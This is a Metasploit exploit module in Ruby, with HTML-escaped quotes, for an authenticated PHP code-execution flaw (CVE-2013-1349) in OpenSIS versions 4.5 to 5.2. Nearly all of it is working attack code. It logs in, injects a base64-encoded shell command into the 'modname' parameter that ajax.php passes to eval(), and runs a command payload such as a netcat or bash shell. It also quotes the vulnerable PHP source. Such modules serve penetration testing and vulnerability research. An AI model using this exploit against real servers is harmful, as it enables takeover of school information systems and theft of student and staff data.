# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;              => "OpenSIS &#039;modname&#039; PHP Code Execution",
      &#039;Description&#039;       => %q{
        This module exploits a PHP code execution vulnerability in OpenSIS
        versions 4.5 to 5.2 which allows any authenticated user to execute
        arbitrary PHP code under the context of the web-server user.
        The &#039;ajax.php&#039; file calls &#039;eval()&#039; with user controlled data from
        the &#039;modname&#039; parameter.
      },
      &#039;License&#039;           => MSF_LICENSE,
      &#039;Author&#039;            =>
        [
          &#039;EgiX&#039;, # Discovery
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # msf exploit
        ],
      &#039;References&#039;        =>
        [
          [&#039;CVE&#039;,   &#039;2013-1349&#039;],
          [&#039;OSVDB&#039;, &#039;100676&#039;],
          [&#039;URL&#039;,   &#039;http://karmainsecurity.com/KIS-2013-10&#039;],
          [&#039;URL&#039;,   &#039;http://sourceforge.net/p/opensis-ce/bugs/59/&#039;]
        ],
      &#039;Payload&#039;           =>
        {
          &#039;BadChars&#039;      => "\x00\x0a\x0d",
          &#039;Compat&#039;        =>
            {
            &#039;PayloadType&#039; => &#039;cmd&#039;,
            &#039;RequiredCmd&#039; => &#039;generic telnet bash netcat netcat-e perl ruby python&#039;,
            }
        },
      &#039;DefaultOptions&#039;    =>
        {
          &#039;ExitFunction&#039;  => &#039;none&#039;
        },
      &#039;Platform&#039;          => &#039;unix&#039;,
      &#039;Arch&#039;              => ARCH_CMD,
      &#039;Targets&#039;           =>
        [
          # Tested on OpenSIS versions 4.9 and 5.2 (Ubuntu Linux)
          [&#039;OpenSIS version 4.5 to 5.2&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;Privileged&#039;        => false,
      &#039;DisclosureDate&#039;    => &#039;Dec 04 2012&#039;,
      &#039;DefaultTarget&#039;     => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The URI for OpenSIS&#039;, &#039;/opensis/&#039;]),
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;The username for OpenSIS&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [true, &#039;The password for OpenSIS&#039;])
      ], self.class)
  end

  #
  # Login
  #
  def login(user, pass)
    @cookie = "PHPSESSID=#{rand_text_alphanumeric(rand(10)+10)};"
    print_status("#{peer} - Authenticating as user &#039;#{user}&#039;")
    res = send_request_cgi({
      &#039;method&#039;     => &#039;POST&#039;,
      &#039;uri&#039;        => normalize_uri(target_uri.path, "index.php"),
      &#039;cookie&#039;     => @cookie,
      &#039;vars_post&#039;  => Hash[{
        &#039;USERNAME&#039; => user,
        &#039;PASSWORD&#039; => pass,
      }.to_a.shuffle]
    })
    if res and res.code == 200 and res.body =~ /Portal\.php/
      print_good("#{peer} - Authenticated as user &#039;#{user}&#039;")
      return true
    else
      print_error("#{peer} - Authenticating as user &#039;#{user}&#039; failed")
      return false
    end
  end

  #
  # Send command for execution
  #
  def execute_command(cmd, opts = { :php_function => &#039;system&#039; } )
    code = Rex::Text.uri_encode(Rex::Text.encode_base64(cmd+"&"))
    junk = rand_text_alphanumeric(rand(10)+6)
    print_status("#{peer} - Sending payload (#{code.length} bytes)")
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;ajax.php&#039;),
      &#039;cookie&#039;    => @cookie,
      &#039;vars_post&#039; => {
        &#039;modname&#039; => "#{junk}?#{junk}=#{junk}&#039;;#{opts[:php_function]}(base64_decode(&#039;#{code}&#039;));//"
      }
    })
    return res
  end

  #
  # Check credentials are valid and confirm command execution
  #
  def check
    return Exploit::CheckCode::Unknown unless login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
    fingerprint = Rex::Text.rand_text_alphanumeric(rand(10)+10)
    print_status("#{peer} - Sending check")
    res = execute_command("echo #{fingerprint}")
    if res and res.body =~ /align=center>#{fingerprint}/
      return Exploit::CheckCode::Vulnerable
    elsif res
      return Exploit::CheckCode::Safe
    end
    return Exploit::CheckCode::Unknown
  end

  def exploit
    return unless login(datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
    php_function = [
      &#039;exec&#039;,
      &#039;shell_exec&#039;,
      &#039;passthru&#039;,
      &#039;system&#039;
    ].sample
    res = execute_command(payload.encoded, { :php_function => php_function })
    if res and res.code == 200 and res.body =~ /hacking_log/i
      print_good("#{peer} - Payload sent successfully")
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Sending payload failed")
    end
  end
end

#
# Source
#
=begin ajax.php
90:  if(strpos($_REQUEST[&#039;modname&#039;],&#039;?&#039;)!==false)
91:  {
92:    $vars = substr($_REQUEST[&#039;modname&#039;],(strpos($_REQUEST[&#039;modname&#039;],&#039;?&#039;)+1));
93:    $modname = substr($_REQUEST[&#039;modname&#039;],0,strpos($_REQUEST[&#039;modname&#039;],&#039;?&#039;));
94:
95:    $vars = explode(&#039;?&#039;,$vars);
96:    foreach($vars as $code)
97:    {
98:      $code = decode_unicode_url("\$_REQUEST[&#039;".str_replace(&#039;=&#039;,"&#039;]=&#039;",$code)."&#039;;");
99:      eval($code);
100:    }
101:  }
=end

